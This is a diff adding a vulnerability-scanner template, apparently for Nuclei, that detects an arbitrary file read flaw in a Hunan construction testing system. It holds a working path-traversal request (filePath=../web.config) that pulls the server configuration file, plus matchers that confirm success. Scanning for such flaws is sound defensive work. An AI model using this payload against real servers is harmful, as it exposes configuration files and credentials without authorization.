@@ -1,0 +1,30 @@
+id: poc-yaml-hunanjianyan-ds-file-anyfile-read
+
+info:
+  name: 湖南建研检测系统 file 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Scripts/admintool?type=file"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: filePath=../web.config
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "web.config"
+          - "</system.web>"
+          - "<configuration>"
+        part: body
+      - type: word
+        words:
+          - "text/json"
+        part: header
